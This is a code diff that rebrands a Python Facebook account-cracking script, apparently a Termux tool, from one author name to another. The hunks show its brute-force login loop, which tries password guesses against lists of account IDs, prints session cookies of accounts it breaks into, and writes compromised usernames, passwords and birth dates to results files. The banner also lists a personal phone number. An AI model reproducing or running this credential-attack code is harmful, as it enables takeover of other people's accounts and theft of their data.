@@ -172,22 +172,22 @@ def loading():
 # LOGO
 def logo():
     print("""\n
-\033[1;92m    _          _
-\033[1;92m     \\        /
-\033[1;92m    __\\______/__
+\033[1;92m
+\033[1;92m 🆁🆈🅳🅰🅷 🆃🅼
+\033[1;92m  
 \033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
- \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
+ \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS NIGERIA [+]
 \033[1;92m╔══o00════════00o═════════════════════════╗
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m Black Gold          \033[1;31;1m █
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGorup Fb  :  \033[1;92m Termux Command World\033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m RydahTm           \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +2349017624430          \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  +2349017624430          \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGorup Fb  :  \033[1;92m Rydah Termux Command World\033[1;31;1m █
 \033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
 \033[1;92m╚═════════════════════════════════════════╝""")
 #CRACK SELESAI
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
-        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By James Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
+        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By RYDAH TM Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
         print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
         print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(cp)),H))
         cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
@@ -209,9 +209,9 @@ def hasil(ok,cp):
                 kontol = memek.replace('\n', '')
                 titid  = kontol.split(' • ')
                 print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
-                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[JAMES-CP] ", "")}{N}')
+                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[RYDAH-CP] ", "")}{N}')
                 try:
-                    log_hasil(titid[0].replace("[JAMES-CP] ", ""), titid[1])
+                    log_hasil(titid[0].replace("[RYDAH-CP] ", ""), titid[1])
                 except requests.exceptions.ConnectionError:
                     continue
                     print("")
@@ -299,7 +299,7 @@ class __chigoue__:
 # PROSES CRACK METODE 3 in 1
     def __metode__(self, cebok, user, pasw):
         global ok,cp,loop
-        animasi = random.choice(["\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]"])
+        animasi = random.choice(["\x1b[1;92m[RYDAH]","\x1b[1;92m[RYDAH]","\x1b[1;92m[RYDAH]","\x1b[1;92m[RYDAH]","\x1b[1;92m[RYDAH]","\x1b[1;92m[RYDAH]","\x1b[1;92m[RYDAH]"])
         sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
         sys.stdout.flush()
         try:
@@ -328,7 +328,7 @@ class __chigoue__:
                     elif "y" in Apk:
                         print(f'\r %sOK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}')
-                    wrt = '[JAMES-OK] %s • %s' % (user,pw)
+                    wrt = '[RYDAH-OK] %s • %s' % (user,pw)
                     ok.append(wrt)
                     cek_apk(session,coki)
                     open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -340,7 +340,7 @@ class __chigoue__:
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
                         print('\r %sCP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
-                        wrt = '[JAMES-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
+                        wrt = '[RYDAH-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                         cp.append(wrt)
                         open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                         break
@@ -350,7 +350,7 @@ class __chigoue__:
                         year  = ''
                     except:pass
                     print('\r %sCP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
-                    wrt = '[JAMES-CP] %s • %s' % (user,pw)
+                    wrt = '[RYDAH-CP] %s • %s' % (user,pw)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
